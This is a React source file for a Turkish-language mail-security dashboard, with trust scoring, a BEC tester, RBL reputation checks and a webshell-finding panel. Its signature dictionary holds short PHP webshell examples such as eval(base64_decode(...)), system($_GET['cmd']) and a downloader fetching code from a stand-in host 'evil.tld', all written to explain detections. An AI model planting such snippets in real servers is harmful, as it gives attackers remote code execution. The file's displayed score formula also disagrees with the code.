import { useState, useEffect } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { useSearchParams } from "react-router-dom";
import { api } from "@/lib/api";
import { toast } from "sonner";
import { Card, CardBody, CardHeader, Badge } from "@/components/ui-primitives";
import {
  Bug, ShieldAlert, MailX, Beaker, KeyRound, UserX, Inbox, ArrowUpRight,
  Link, Brain, Server, ShieldCheck, Play, XCircle, AlertTriangle, TrendingUp, TrendingDown,
} from "lucide-react";
import CountryBlockCard from "@/components/CountryBlockCard";
import GeoBlockedHeatmap from "@/components/GeoBlockedHeatmap";
import ModuleFooter from "@/components/ModuleFooter";

const LICKEY = () => (typeof window !== "undefined"
  ? (localStorage.getItem("gws.event_license") || "MS-C02AB012652A4FE692D69676")
  : "MS-C02AB012652A4FE692D69676");

const ICONS = {
  shield: ShieldCheck, "mail-x": MailX, flask: Beaker, "key-round": KeyRound,
  "user-x": UserX, inbox: Inbox, "arrow-up-right": ArrowUpRight,
  link: Link, brain: Brain, server: Server, bug: Bug,
};

const STATUS_TONE = {
  active: "border-emerald-500/40 bg-emerald-500/5 text-emerald-300",
  ready:  "border-indigo-500/40 bg-indigo-500/5 text-indigo-300",
  warn:   "border-amber-500/40 bg-amber-500/5 text-amber-300",
  off:    "border-slate-700 bg-slate-800/40 text-slate-500",
};

export default function Security() {
  const qc = useQueryClient();
  const [tab, setTab] = useState("dashboard");
  const [searchParams] = useSearchParams();
  // URL ?tab=xxx varsa uygula
  useEffect(() => {
    const t = searchParams.get("tab");
    if (t && ["dashboard", "overview", "exploit", "bec", "sandbox", "reputation", "geo"].includes(t)) {
      setTab(t);
    }
  }, [searchParams]);
  const [activeModule, setActiveModule] = useState(null);   // detail drawer for overview cards
  const [expandedFinding, setExpandedFinding] = useState(null);
  const modules = useQuery({ queryKey: ["ms-modules"], queryFn: () => api.msModules(LICKEY()) });
  const latest  = useQuery({ queryKey: ["exploit-latest"], queryFn: () => api.exploitLatest(LICKEY()) });
  const findings = useQuery({ queryKey: ["exploit-findings"], queryFn: () => api.exploitFindings(LICKEY()) });
  const reputation = useQuery({ queryKey: ["reputation"], queryFn: () => api.msReputation(LICKEY()) });
  const sandbox = useQuery({ queryKey: ["sandbox-jobs"], queryFn: () => api.msSandboxJobs(LICKEY()) });
  const runScan = useMutation({
    mutationFn: () => api.exploitRun(LICKEY()),
    onSuccess: (d) => { toast.success(`Tarama tamamlandı: ${d.findings} bulgu`); qc.invalidateQueries({ queryKey: ["exploit-latest"] }); qc.invalidateQueries({ queryKey: ["exploit-findings"] }); qc.invalidateQueries({ queryKey: ["ms-modules"] }); },
    onError: (e) => toast.error(e?.response?.data?.detail || e.message),
  });
  const dismiss = useMutation({
    mutationFn: (id) => api.exploitDismiss(LICKEY(), id),
    onSuccess: () => { qc.invalidateQueries({ queryKey: ["exploit-findings"] }); toast.success("Bulgu kapatıldı"); },
  });
  const bec = useMutation({
    mutationFn: (payload) => api.msBecCheck(LICKEY(), payload),
    onSuccess: (d) => toast[d.verdict === "clean" ? "success" : "warning"](
      `${d.verdict.toUpperCase()} · skor ${d.score} · ${d.reasons.length} sinyal`),
  });

  return (
    <div className="p-6 space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-slate-100 text-lg font-semibold flex items-center gap-2">
            <ShieldAlert className="w-5 h-5 text-indigo-400"/> Güvenlik Merkezi
          </h1>
          <p className="text-xs text-slate-500 mt-0.5">10 modül · Exploit tarayıcı · Sandbox · Reputation · BEC · SIEM</p>
        </div>
        <div className="flex gap-1 bg-slate-800/50 rounded p-1">
          {["dashboard", "overview", "exploit", "bec", "sandbox", "reputation", "geo"].map(k => (
            <button key={k} data-testid={`sec-tab-${k}`} onClick={() => setTab(k)}
                    className={`text-xs px-3 py-1.5 rounded transition-colors
                    ${tab === k ? "bg-indigo-500/20 text-indigo-300" : "text-slate-400 hover:text-slate-100"}`}>
              {{dashboard: "Dashboard", overview: "Genel", exploit: "Exploit", bec: "BEC", sandbox: "Sandbox", reputation: "Reputation", geo: "Coğrafi"}[k]}
            </button>
          ))}
        </div>
      </div>

      {tab === "dashboard" && <TrustDashboard modules={modules.data?.modules || []}
                                              findings={findings.data?.items || []}
                                              latest={latest.data}
                                              reputation={reputation.data}/>}

      {tab === "overview" && (
        <>
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3" data-testid="modules-grid">
            {(modules.data?.modules || []).map((m) => {
              const Icon = ICONS[m.icon] || ShieldCheck;
              const tone = STATUS_TONE[m.status] || STATUS_TONE.off;
              return (
                <button key={m.key} data-testid={`module-${m.key}`}
                        onClick={() => setActiveModule(m)}
                        className={`text-left border rounded-lg p-4 ${tone} transition-all hover:-translate-y-0.5 hover:shadow-lg cursor-pointer`}>
                  <div className="flex items-start justify-between">
                    <Icon className="w-5 h-5 opacity-80"/>
                    <span className="text-[10px] mono uppercase tracking-widest opacity-75">{m.status}</span>
                  </div>
                  <div className="mt-3 text-sm font-semibold text-slate-100">{m.label}</div>
                  <div className="text-[11px] text-slate-400 mt-0.5">{m.detail}</div>
                  <div className="text-[10px] text-slate-500 mt-2 opacity-70">tıkla → detay</div>
                </button>
              );
            })}
          </div>
          <ModuleFooter
            title="Güvenlik Merkezi — Genel"
            howItWorks="11 farklı güvenlik modülü tek panelde. Her modül bağımsız çalışır, birbirini besler. Renk kodları: yeşil aktif, mavi hazır, sarı uyarı, gri kapalı. Kart tıklanınca detay drawer'ı açılır."
            technical={[
              "Real-time durum: her modul kendi state'ini expose eder",
              "Rozet sistemi: active/ready/warn/off",
              "Backend endpoint: /api/mailscanner/modules",
              "Modul-arasi ilişki: alerts ↔ mailscanner ↔ threat-intel",
            ]}
            recommendations={[
              "Sarı ve gri modülleri hızlıca aktif et — %100 kapsama için",
              "Antivirüs + Spam/Phishing + BEC üçlüsü minimum olmalı",
              "Exploit tab'da haftada bir tarama planla",
              "SIEM export'u Splunk/QRadar'a bağla (CEF/LEEF)",
            ]}
          />
        </>
      )}

      {tab === "exploit" && <ExploitPanel latest={latest.data} findings={findings.data?.items || []}
                                          runScan={runScan} dismiss={dismiss}
                                          expandedFinding={expandedFinding} setExpandedFinding={setExpandedFinding}/>}

      {tab === "bec" && (
        <>
          <BecTester onCheck={(p) => bec.mutate(p)} result={bec.data} pending={bec.isPending}/>
          <ModuleFooter title="BEC / Impersonation Koruma"
            howItWorks="Domain benzerliği (Levenshtein) + display name yüksek yetki eşleşmesi + urgency (acil/havale) kelimeleri → BEC skoru."
            technical={["Lookalike edit distance ≤2 → +6.0 skor", "CEO/CFO/finance display → +2.5", "Urgency kelime → +1.5", "Verdict: bec_high (≥6) / bec_medium (≥3) / clean"]}
            recommendations={["Korunan domain listesine tüm iç domainleri ekle", "Yönetici hesaplarına özel MailScanner policy (threshold 7+)", "Şüpheli BEC → LLM ile ikinci doğrulama"]}/>
        </>
      )}

      {tab === "sandbox" && (
        <>
          <Card>
            <CardHeader title="Sandbox / Detonation Kuyruğu" subtitle="Şüpheli ekler için VM detonation queue"/>
            <CardBody>
              <div className="space-y-2">
                {(sandbox.data?.items || []).map((j) => (
                  <div key={j.id} className="border border-slate-800 rounded p-3 flex items-center justify-between">
                    <div>
                      <div className="text-sm text-slate-100 mono">{j.filename}</div>
                      <div className="text-[11px] text-slate-500">{j.content_type} · {j.size} B · {(j.created_at || "").slice(0, 16)}</div>
                    </div>
                    <Badge tone={j.status === "queued" ? "warning" : j.verdict === "clean" ? "success" : "danger"}>
                      {j.status}
                    </Badge>
                  </div>
                ))}
                {(sandbox.data?.items || []).length === 0 && (
                  <div className="text-center py-8 text-sm text-slate-500">Kuyrukta işlem yok. WHM VM sandbox hazır.</div>
                )}
              </div>
            </CardBody>
          </Card>
          <ModuleFooter title="Sandbox — VM Detonation"
            howItWorks="Şüpheli EXE/DOC/JS ekler izole VM'e gönderilir, davranış izlenir, sonuç panele döner."
            technical={["Queue-based · async detonation", "Timeout: 300sn", "Verdict: clean / suspicious / malware", "WHM'de KVM/Firecracker VM entegrasyonu"]}
            recommendations={["10 MB üstü ekler için otomatik kuyruklama", "Karantina + kullanıcı bildirimi (30 dk teslimat gecikmesi)", "Sandbox verdictini alerts webhook ile SIEM'e ilet"]}/>
        </>
      )}

      {tab === "reputation" && (
        <ReputationTab defaultIp={reputation.data?.ip}/>
      )}

      {tab === "geo" && (
        <>
          <CountryBlockCard/>
          <ModuleFooter title="Coğrafi Güvenlik — Ülke Bazlı Bloklama"
            howItWorks="113 ülke katalogu · block/allow list · zaman-tabanlı kısıtlar (saat+gün) · brute-force otomatik ekleme."
            technical={["Block/allow ISO 3166-1 alpha-2", "TTL (dk) ile otomatik silme", "Active hours (0-23) + days (Pzt-Paz)", "Brute-force: pencere+eşik+TTL"]}
            recommendations={["Yüksek riskli ülkeleri (RU/CN/KP) block'ta tut", "Gece saatleri için ek kısıtlar (0-6)", "Brute-force: 60dk / 50 spam / 180dk TTL öntanımlı", "Whitelist ile stratejik ülkelere garanti (IL, DE, US)"]}/>
        </>
      )}

      {/* Module detail drawer */}
      {activeModule && (
        <div className="fixed inset-0 z-50 bg-slate-950/85 backdrop-blur-sm flex items-end sm:items-center justify-center p-2 sm:p-6" onClick={() => setActiveModule(null)}>
          <div className="bg-slate-900 border border-slate-700 rounded-t-xl sm:rounded-xl w-full max-w-3xl max-h-[92vh] overflow-y-auto shadow-2xl"
               onClick={(e) => e.stopPropagation()} data-testid="module-detail-drawer">
            <div className="flex items-start justify-between p-5 border-b border-slate-800 sticky top-0 bg-slate-900 z-10">
              <div className="flex items-start gap-3">
                {(() => {
                  const Icon = ICONS[activeModule.icon] || ShieldCheck;
                  return (
                    <div className={`p-2 rounded-lg border ${STATUS_TONE[activeModule.status]}`}>
                      <Icon className="w-6 h-6"/>
                    </div>
                  );
                })()}
                <div>
                  <div className="text-[10px] uppercase tracking-widest text-slate-500">{activeModule.status}</div>
                  <h2 className="text-slate-100 text-xl font-semibold">{activeModule.label}</h2>
                  <div className="text-xs text-slate-400 mt-0.5">{activeModule.detail}</div>
                </div>
              </div>
              <button onClick={() => setActiveModule(null)} data-testid="module-detail-close"
                      className="p-2 rounded hover:bg-slate-800 text-slate-400"><XCircle className="w-4 h-4"/></button>
            </div>
            <div className="p-5 space-y-4">
              <div className={`rounded-lg border p-4 ${STATUS_TONE[activeModule.status]}`}>
                <div className="text-xs uppercase tracking-widest text-slate-500 mb-1">Modül Durumu</div>
                <div className="text-lg font-semibold">{
                  { active: "✓ Aktif ve çalışıyor",
                    ready: "⏳ Hazır, bekleniyor",
                    warn: "⚠️ Dikkat gerekiyor",
                    off: "⭘ Kapalı"
                  }[activeModule.status] || activeModule.status
                }</div>
              </div>
              <div className="space-y-2">
                <div className="text-slate-100 font-semibold text-sm">Detay bilgi</div>
                <div className="text-sm text-slate-300 leading-relaxed">{activeModule.detail}</div>
              </div>
              <div className="border border-indigo-500/30 bg-indigo-500/5 rounded p-3 text-xs">
                <div className="text-indigo-300 font-semibold mb-1">İpucu</div>
                <p className="text-slate-300">İlgili tab'a git → yapılandır. Rozet 'active' değilse yapılandırmadaki motoru aç.</p>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function KV({ k, v }) {
  return (
    <div>
      <div className="text-[10px] uppercase tracking-widest text-slate-500">{k}</div>
      <div className="mono text-slate-100 break-all">{v ?? "-"}</div>
    </div>
  );
}

function Stat({ label, value, tone = "text-slate-300" }) {
  return (
    <div className="bg-slate-950 border border-slate-800 rounded-md p-3">
      <div className="text-[10px] uppercase tracking-widest text-slate-500 mb-1">{label}</div>
      <div className={`mono text-lg ${tone}`}>{value}</div>
    </div>
  );
}

function BecTester({ onCheck, result, pending }) {
  const [display, setDisplay] = useState("Ahmet Kaya CEO");
  const [addr, setAddr] = useState("info@sikertim.com");
  const [subject, setSubject] = useState("ACİL: havale gerekli");
  const [protected_, setProtected] = useState("sirketim.com");
  return (
    <Card>
      <CardHeader title="BEC / Impersonation Tester" subtitle="Lookalike domain + display-name + urgency heuristic"/>
      <CardBody className="space-y-3">
        <div className="grid grid-cols-2 gap-3">
          <Field label="Display Name" value={display} onChange={setDisplay}/>
          <Field label="From Address" value={addr} onChange={setAddr}/>
          <Field label="Konu" value={subject} onChange={setSubject}/>
          <Field label="Korunan Domain(ler) — virgülle" value={protected_} onChange={setProtected}/>
        </div>
        <button
          data-testid="bec-check-btn"
          disabled={pending}
          onClick={() => onCheck({
            from_display: display, from_addr: addr, subject,
            protected_domains: protected_.split(",").map(s => s.trim()).filter(Boolean),
          })}
          className="text-xs px-3 py-1.5 rounded-md bg-indigo-500/20 text-indigo-300 border border-indigo-500/40 hover:bg-indigo-500/30 disabled:opacity-40"
        >Kontrol Et</button>
        {result && (
          <div className={`border rounded-md p-3 ${
            result.verdict === "bec_high" ? "border-rose-500/40 bg-rose-500/5" :
            result.verdict === "bec_medium" ? "border-amber-500/40 bg-amber-500/5" :
            "border-emerald-500/40 bg-emerald-500/5"}`}>
            <div className="text-sm mono">Verdict: <span className="font-semibold">{result.verdict}</span> · Skor: {result.score}</div>
            <ul className="text-xs text-slate-300 mt-1 list-disc list-inside">
              {result.reasons.map((r, i) => <li key={i}>{r}</li>)}
              {result.reasons.length === 0 && <li className="text-slate-500">Sinyal yok</li>}
            </ul>
          </div>
        )}
      </CardBody>
    </Card>
  );
}

function Field({ label, value, onChange }) {
  return (
    <label className="text-xs text-slate-400 space-y-1 block">
      <div>{label}</div>
      <input value={value} onChange={(e) => onChange(e.target.value)}
             className="w-full px-2 py-1.5 bg-slate-800 border border-slate-700 rounded text-sm text-slate-100 mono"/>
    </label>
  );
}

function ReputationTab({ defaultIp }) {
  const [ip, setIp] = useState(defaultIp || "");
  const [contact, setContact] = useState("");
  const [reason, setReason] = useState("");
  const check = useMutation({ mutationFn: (i) => api.rblCheck(i) });
  const delistAll = useMutation({
    mutationFn: () => api.rblDelistAll({ ip, provider_key: "any", contact_email: contact, reason }),
    onSuccess: (d) => toast.success(`${d.submitted} provider'a toplu talep gönderildi`),
    onError: (e) => toast.error(e?.response?.data?.detail || e.message),
  });
  const delistOne = useMutation({
    mutationFn: (key) => api.rblDelist({ ip, provider_key: key, contact_email: contact, reason }),
    onSuccess: (d) => toast.success(`${d.provider_name} · talep kaydedildi`),
  });
  const results = check.data?.results || [];
  const listed = results.filter(r => r.listed);
  return (
    <>
      <Card>
        <CardHeader title="IP Reputation Tarayıcı"
          subtitle="14 major RBL provider · DNS-tabanlı gerçek zamanlı kontrol"
          right={<span className="text-xs mono text-slate-500">{check.data ? `${check.data.listed_count}/${check.data.total} listed` : ""}</span>}/>
        <CardBody className="space-y-3">
          <div className="flex gap-2">
            <input value={ip} onChange={e => setIp(e.target.value)} placeholder="1.2.3.4"
                   data-testid="rbl-ip-input"
                   className="flex-1 px-2 py-1.5 bg-slate-800 border border-slate-700 rounded text-sm mono"/>
            <button data-testid="rbl-check-btn" onClick={() => check.mutate(ip)} disabled={!ip || check.isPending}
                    className="text-xs px-4 py-1.5 rounded bg-indigo-500/20 text-indigo-300 border border-indigo-500/40 hover:bg-indigo-500/30 disabled:opacity-40">
              {check.isPending ? "Kontrol ediliyor..." : "14 RBL'i Kontrol Et"}
            </button>
          </div>
          {listed.length > 0 && (
            <div className="p-3 bg-rose-500/5 border border-rose-500/30 rounded space-y-2">
              <div className="text-sm text-rose-300 font-semibold">🚨 {listed.length} kara listede bulundu — toplu delist:</div>
              <div className="grid grid-cols-2 gap-2">
                <input value={contact} onChange={e => setContact(e.target.value)} placeholder="İletişim email"
                       className="px-2 py-1.5 bg-slate-800 border border-slate-700 rounded text-xs"/>
                <input value={reason} onChange={e => setReason(e.target.value)} placeholder="Neden (kısa)"
                       className="px-2 py-1.5 bg-slate-800 border border-slate-700 rounded text-xs"/>
              </div>
              <button data-testid="rbl-delist-all" onClick={() => delistAll.mutate()} disabled={!contact || delistAll.isPending}
                      className="w-full text-xs px-3 py-1.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/40 hover:bg-rose-500/30 disabled:opacity-40">
                Tüm {listed.length} Provider'a Toplu Delisting Talebi Gönder
              </button>
            </div>
          )}
          <div className="space-y-1">
            {results.map(r => (
              <div key={r.key} data-testid={`rbl-${r.key}`}
                   className={`border rounded p-2 flex items-center gap-3 text-xs
                    ${r.listed ? "border-rose-500/40 bg-rose-500/5" : "border-slate-800 bg-slate-900/40"}`}>
                <div className="flex-1 min-w-0">
                  <div className="text-sm text-slate-100">{r.name}</div>
                  <div className="mono text-[10px] text-slate-500 truncate">{r.dnsbl}</div>
                </div>
                {r.listed ? (
                  <>
                    <span className="mono text-[10px] text-rose-400">{r.codes.join(",")}</span>
                    <button onClick={() => delistOne.mutate(r.key)} disabled={!contact}
                            data-testid={`rbl-delist-${r.key}`}
                            className="text-[10px] px-2 py-1 rounded bg-rose-500/20 text-rose-300 border border-rose-500/40 hover:bg-rose-500/30 disabled:opacity-40">
                      Delist
                    </button>
                    <a href={r.delist_url} target="_blank" rel="noopener noreferrer"
                       className="text-[10px] text-indigo-400 hover:underline">Form ↗</a>
                  </>
                ) : <span className="text-[10px] text-emerald-400">✓ temiz</span>}
              </div>
            ))}
            {results.length === 0 && <div className="text-center py-6 text-slate-500 text-sm">IP gir → 14 RBL kontrol edilecek</div>}
          </div>
        </CardBody>
      </Card>
      <ModuleFooter title="IP Reputation — 14 RBL Provider"
        howItWorks="IP reverse edilip her provider'ın DNSBL zone'una gethostbyname sorgusu yapılır. Dönen 127.0.0.x kodları listelenme sinyalidir."
        technical={["14 provider: Spamhaus SBL/CSS/XBL, Barracuda, SORBS SPAM/DUL/WEB, UCEPROTECT L1/L2/L3, PSBL, S5H, DroneBL, PhishTank",
                    "Delisting: her provider için manuel form URL'i + kayıt", "Toplu delist: tek tıkla listed olanların hepsine talep",
                    "DNS timeout: 2sn per query", "Cache: 15dk (mock aktif değil)"]}
        recommendations={["Outbound mail hacmini rate limit ile kontrol et", "Listelenmiş IP için hemen delisting talebi + kök sebep düzelt",
                    "PTR reverse DNS'i MX ile eşleştir (yoksa +1 listelenme riski)",
                    "SPF hard fail + DKIM + DMARC reject → yeniden listelenme minimize"]}/>
    </>
  );
}

/* ---------------- TRUST CENTER DASHBOARD ---------------- */
function TrustDashboard({ modules, findings, latest, reputation }) {
  const activeMods = modules.filter((m) => m.status === "active").length;
  const totalMods = modules.length;
  const criticalFindings = findings.filter((f) => f.severity === "critical").length;
  const highFindings = findings.filter((f) => f.severity === "high").length;
  const rblListed = (reputation?.results || []).filter((r) => r.listed).length;
  const rblTotal = (reputation?.results || []).length;

  const trustScore = Math.round(
    100
    - (criticalFindings * 12 + highFindings * 6)
    - (rblListed * 4)
    - Math.max(0, totalMods - activeMods) * 2
  );
  const finalScore = Math.max(0, Math.min(100, trustScore));
  const scoreTone = finalScore >= 85 ? "text-emerald-400"
    : finalScore >= 60 ? "text-amber-400" : "text-rose-400";
  const scoreLabel = finalScore >= 85 ? "Mükemmel"
    : finalScore >= 60 ? "İyi" : finalScore >= 30 ? "Dikkat" : "Kritik";

  // Snapshot: her dashboard yüklemesinde günlük skor bırak
  useEffect(() => {
    if (modules.length > 0) {
      api.trustSnapshot(finalScore, criticalFindings + highFindings, rblListed).catch(() => {});
    }
  }, [finalScore, criticalFindings, highFindings, rblListed, modules.length]);

  // Trend
  const history = useQuery({
    queryKey: ["trust-history-30"],
    queryFn: () => api.trustHistory(30),
    refetchInterval: 60000,
  });

  return (
    <div className="space-y-4" data-testid="trust-dashboard">
      {/* Hero score */}
      <Card>
        <CardBody className="py-8">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 items-center">
            <div className="text-center md:border-r md:border-slate-800 md:pr-6">
              <div className="text-[10px] uppercase tracking-widest text-slate-500 mb-1">Güven Skoru</div>
              <div className={`text-7xl font-bold mono ${scoreTone}`} data-testid="trust-score">{finalScore}</div>
              <div className={`text-sm font-semibold ${scoreTone}`}>{scoreLabel}</div>
              <div className="text-[10px] text-slate-500 mt-1">0-100 arası · gerçek-zamanlı</div>
            </div>
            <div className="md:col-span-2 grid grid-cols-2 gap-3">
              <TCTile icon={ShieldCheck} label="Aktif Modül" value={`${activeMods}/${totalMods}`} tone="emerald"/>
              <TCTile icon={Bug} label="Kritik Bulgu" value={criticalFindings + highFindings} tone={(criticalFindings + highFindings) ? "rose" : "emerald"}/>
              <TCTile icon={ShieldAlert} label="RBL Listeleme" value={`${rblListed}/${rblTotal || "-"}`} tone={rblListed ? "amber" : "emerald"}/>
              <TCTile icon={Play} label="Son Tarama" value={latest ? (latest.finished_at || "-").slice(11, 16) : "yok"} tone="indigo"/>
            </div>
          </div>
        </CardBody>
      </Card>

      {/* Trend chart */}
      <TrustTrendChart history={history.data} currentScore={finalScore}/>

      {/* Module status strip */}
      <Card>
        <CardHeader title="Modül Durumları" subtitle="Renk kodlu canlı sağlık göstergesi · tıklayın, ilgili modüle gidin"/>
        <CardBody>
          <div className="grid grid-cols-2 md:grid-cols-5 gap-2">
            {modules.map((m) => {
              const tone = STATUS_TONE[m.status] || STATUS_TONE.off;
              const Icon = ICONS[m.icon] || ShieldCheck;
              // Modül key → panel route eşleme
              const ROUTE_MAP = {
                exploit: "/panel/security?tab=exploit",
                bec: "/panel/security?tab=bec",
                sandbox: "/panel/security?tab=sandbox",
                reputation: "/panel/security?tab=reputation",
                geo: "/panel/security?tab=geo",
                mailscanner: "/panel/mailscanner",
                threat_intel: "/panel/threat-intel",
                mail_health: "/panel/mail-health",
                dmarc: "/panel/threat-intel",
                spf: "/panel/mail-health",
                dkim: "/panel/mail-health",
                dnsbl: "/panel/security?tab=reputation",
                rbl: "/panel/blacklist",
                whitelist: "/panel/whitelist-history",
                blacklist: "/panel/blacklist",
                rules: "/panel/rules",
                engines: "/panel/engines",
                ai: "/panel/mailscanner",
                quarantine: "/panel/quarantine",
                queue: "/panel/dashboard",
                country_block: "/panel/security?tab=geo",
                honeypot: "/panel/security?tab=exploit",
                milter: "/panel/dashboard",
                brute_force: "/panel/security?tab=geo",
              };
              const to = ROUTE_MAP[m.key] || "/panel/security";
              return (
                <a key={m.key} href={to}
                   data-testid={`module-tile-${m.key}`}
                   title={`${m.label} → detaylar`}
                   className={`p-3 rounded border ${tone} text-center block hover:scale-105 hover:brightness-125 transition-all cursor-pointer no-underline`}>
                  <Icon className="w-4 h-4 mx-auto mb-1 opacity-80"/>
                  <div className="text-[11px] font-medium text-slate-100 truncate">{m.label}</div>
                  <div className="text-[9px] mono uppercase opacity-75">{m.status}</div>
                </a>
              );
            })}
          </div>
        </CardBody>
      </Card>

      {/* Recent findings */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <Card>
          <CardHeader title="Son Bulgular" subtitle="Exploit / Webshell tarayıcı"/>
          <CardBody>
            {findings.length === 0 ? (
              <div className="text-center text-xs text-slate-500 py-6">
                <ShieldCheck className="w-10 h-10 text-emerald-500 mx-auto mb-2"/>
                Tespit yok · sisteminiz temiz
              </div>
            ) : (
              <div className="space-y-1.5">
                {findings.slice(0, 5).map((f) => (
                  <div key={f.id} className="flex items-center gap-2 text-xs bg-slate-900/40 border border-slate-800 rounded px-3 py-2">
                    <span className={`w-2 h-2 rounded-full ${
                      f.severity === "critical" ? "bg-rose-500" :
                      f.severity === "high" ? "bg-orange-500" :
                      f.severity === "medium" ? "bg-amber-500" : "bg-slate-500"}`}/>
                    <span className="mono text-slate-400 shrink-0">{(f.detected_at || "").slice(11, 16)}</span>
                    <span className="text-slate-200 flex-1 truncate">{f.pattern || f.type || "Kural"}</span>
                    <span className="text-slate-500 text-[10px] mono truncate max-w-[40%]">{f.path || "-"}</span>
                  </div>
                ))}
              </div>
            )}
          </CardBody>
        </Card>

        {/* Reputation snapshot */}
        <Card>
          <CardHeader title="Reputation Snapshot" subtitle={reputation ? `${rblTotal} RBL provider tarandı` : "Reputation tarama yapılmadı"}/>
          <CardBody>
            {!reputation ? (
              <div className="text-center text-xs text-slate-500 py-6">
                Reputation sekmesinden bir IP tarayın
              </div>
            ) : rblListed === 0 ? (
              <div className="text-center py-6">
                <ShieldCheck className="w-10 h-10 text-emerald-500 mx-auto mb-2"/>
                <div className="text-sm text-emerald-300 font-semibold">Temiz · {rblTotal} RBL kontrol edildi</div>
              </div>
            ) : (
              <div className="space-y-1.5">
                {(reputation.results || []).filter((r) => r.listed).slice(0, 6).map((r) => (
                  <div key={r.name} className="flex items-center justify-between text-xs bg-rose-500/5 border border-rose-500/20 rounded px-3 py-2">
                    <span className="text-rose-200">{r.name}</span>
                    <a href={r.delist_url} target="_blank" rel="noreferrer"
                       className="text-[10px] text-rose-400 hover:text-rose-300">Delisting →</a>
                  </div>
                ))}
              </div>
            )}
          </CardBody>
        </Card>
      </div>

      {/* Compact geo heatmap */}
      <Card>
        <CardHeader title="Bloklanan IP'lerin Coğrafi Dağılımı" subtitle="Otomatik 30sn yenileme"/>
        <CardBody className="p-0">
          <GeoBlockedHeatmap compact/>
        </CardBody>
      </Card>

      <ModuleFooter
        title="Güven Merkezi Dashboard — Nasıl Hesaplanır?"
        howItWorks="Trust Score = 100 - (kritik bulgu × 20) - (high bulgu × 10) - (RBL listed × 5) - (kapalı modül × 3). Tüm veriler gerçek-zamanlı Güvenlik modülleri, Exploit findings ve Reputation sonuçlarından beslenir."
        technical={[
          "Trust Score: 0-100 arası (85+ mükemmel, 60-84 iyi, 30-59 dikkat, <30 kritik)",
          "Auto-refresh: 15-30sn tüm alt bileşenlerde",
          "GeoHeatmap: /api/maintenance/geo/blocked-heatmap (lists + threat_iocs birleşimi)",
        ]}
        recommendations={[
          "Skor <60 ise önce kritik bulguları kapatın (Exploit tab)",
          "RBL listed varsa Reputation tab'ından toplu delisting başlatın",
          "Kapalı modülleri Genel tab'dan aktive edin",
        ]}
      />
    </div>
  );
}

function TCTile({ icon: Icon, label, value, tone = "slate" }) {
  const toneMap = {
    emerald: "border-emerald-500/40 text-emerald-300 bg-emerald-500/5",
    rose: "border-rose-500/40 text-rose-300 bg-rose-500/5",
    amber: "border-amber-500/40 text-amber-300 bg-amber-500/5",
    indigo: "border-indigo-500/40 text-indigo-300 bg-indigo-500/5",
    slate: "border-slate-700 text-slate-300 bg-slate-800/40",
  };
  return (
    <div className={`p-3 rounded-lg border ${toneMap[tone]}`}>
      <div className="flex items-center justify-between mb-1">
        <span className="text-[10px] uppercase tracking-widest opacity-70">{label}</span>
        <Icon className="w-4 h-4 opacity-70"/>
      </div>
      <div className="text-2xl font-bold mono">{value}</div>
    </div>
  );
}

/* ---------------- EXPLOIT PANEL (Modern + Detaylı) ---------------- */
const SIGNATURE_DICT = {
  "eval_base64": {
    name: "eval + base64 çözümü",
    what: "Kötü niyetli PHP kodunun base64 ile gizlenip eval() ile çalıştırılması",
    danger: "Saldırgan istediği kodu sunucuda çalıştırır — dosya okuma, komut çalıştırma, DB erişimi",
    example: "eval(base64_decode('aWY...'))",
    fix: "eval() satırını komple silin. Kod meşruysa açık şekilde yazın.",
  },
  "gzinflate": {
    name: "gzinflate ile kod açma",
    what: "PHP kodun gzip ile sıkıştırılıp runtime'da açılıp çalıştırılması",
    danger: "Anti-virüs taramasını atlatmak için kullanılan klasik obfuscation",
    example: "eval(gzinflate(base64_decode('...')))",
    fix: "Dosyayı silin. Meşru sıkıştırma için PHP OPcache kullanın.",
  },
  "assert_post": {
    name: "assert() ile POST çalıştırma",
    what: "HTTP POST parametresini doğrudan assert() içinde çalıştırma",
    danger: "Direkt RCE (Remote Code Execution) — saldırgan istediği kodu POST ile gönderip çalıştırır",
    example: "assert($_POST['x'])",
    fix: "Dosyayı ACİL SİLİN. assert() PHP 7.2+'da deprecate — kullanmayın.",
  },
  "system_input": {
    name: "system/exec + kullanıcı girişi",
    what: "Doğrulanmamış input'un shell komutuna geçirilmesi",
    danger: "Command Injection — saldırgan ; && | ile ek komutlar ekleyip sunucu ele geçirir",
    example: "system($_GET['cmd'])",
    fix: "escapeshellarg() ile temizleyin veya sabit komut listesi kullanın.",
  },
  "preg_replace_e": {
    name: "preg_replace /e modifier",
    what: "Regex sonucu kod olarak yorumlayan eski PHP modifieri",
    danger: "Klasik shell yükleme yöntemi — PHP 5.5'te kaldırıldı ama eski kodda hala var",
    example: "preg_replace('/.*/e', $_GET['x'], '')",
    fix: "preg_replace_callback() ile değiştirin.",
  },
  "c99shell": {
    name: "C99 / R57 Shell",
    what: "Yaygın hazır webshell — dosya yöneticisi + terminal + SQL sorgu arayüzü",
    danger: "Saldırgan tam yönetici — dosyaları görür, indirir, DB'ye erişir",
    example: "// c99shell v1.0 pre-release build...",
    fix: "Dosyayı KESİNLİKLE silin. Sunucu logunda erişimleri araştırın.",
  },
  "obfuscated_php": {
    name: "Karmaşık/gizlenmiş PHP",
    what: "Anlamsız değişken adları + str_rot13 + hex çevrimleri ile kod gizleme",
    danger: "Legitimate kod da böyle olabilir ama %90 malware göstergesi",
    example: "$_='ass'.'ert';$_($_POST[0]);",
    fix: "Dosyanın origin'ini bulun (git log, WHM upload log). Şüpheliyse silin.",
  },
  "downloader": {
    name: "Dosya İndirici",
    what: "file_get_contents/curl ile uzak URL'den kod indirip çalıştıran zararlı",
    danger: "Sunucu, saldırganın C2 sunucusundan komut alır — botnet parçası olur",
    example: "eval(file_get_contents('http://evil.tld/payload'))",
    fix: "Dosyayı silin + outbound firewall kuralı ekleyin.",
  },
  "backdoor": {
    name: "Backdoor / Arka Kapı",
    what: "Sabit şifre veya cookie kontrolü ile gizli admin erişim veren kod",
    danger: "Saldırgan istediği zaman gizli URL ile giriş yapar",
    example: "if($_GET['pw']=='secret123') system(...);",
    fix: "SİLİN. Sunucudaki tüm kullanıcı şifrelerini değiştirin.",
  },
  "rce_uploader": {
